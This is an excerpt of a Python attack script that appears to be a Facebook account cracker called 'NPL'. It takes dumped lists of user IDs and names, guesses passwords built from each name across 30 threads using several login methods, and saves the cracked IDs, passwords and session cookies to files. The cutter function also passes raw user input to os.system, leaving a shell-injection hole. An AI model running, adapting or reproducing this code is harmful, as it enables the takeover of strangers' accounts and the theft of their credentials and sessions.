...
from concurrent.futures import ThreadPoolExecutor as sarfrazNPL
from string import * 
...
sys.stdout.write('\x1b]2; NPL\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[NPL] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NPLb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NPLb};{ckkk}"
                    print(f"\r{R} [NPL-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NPL_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NPL_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [NPL-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/NPL_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NPL_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [NPL-CP] {sid} | {ps} {S}")
                    cps.append(sid)
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sarfrazNPL(max_workers=30) as NPLworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                NPLworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                NPLworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                NPLworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                NPLworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/NPL.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/NPL.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    NPL = input('Put File Name :')
    print(" ")
    sarfraz = input('Saving Put File Name :')
    os.system('touch ' +sarfraz)
    os.system('sort -r '+NPL+' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + NPL )
    print(47*'-')
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/NPL.txt\n') 
        filepath = input("Put File Name: ")
